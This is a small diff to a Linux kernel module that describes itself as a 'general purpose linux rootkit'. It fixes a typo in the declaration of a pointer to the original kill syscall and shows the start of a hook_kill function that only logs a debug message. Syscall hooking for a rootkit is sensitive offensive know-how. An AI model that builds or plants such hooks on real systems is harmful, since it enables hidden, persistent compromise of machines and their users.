@@ -8,7 +8,7 @@ MODULE_AUTHOR("0xwillow");
 MODULE_DESCRIPTION("general purpose linux rootkit");
 MODULE_VERSION("1.0");
 
-staticm notrace asmlinkage int (*orig_kill) (const struct pt_regs *);
+static notrace asmlinkage int (*orig_kill) (const struct pt_regs *);
 
 asmlinkage notrace int hook_kill(const struct pt_regs *regs) {
     pr_info("debug: hooked kill :D\n");
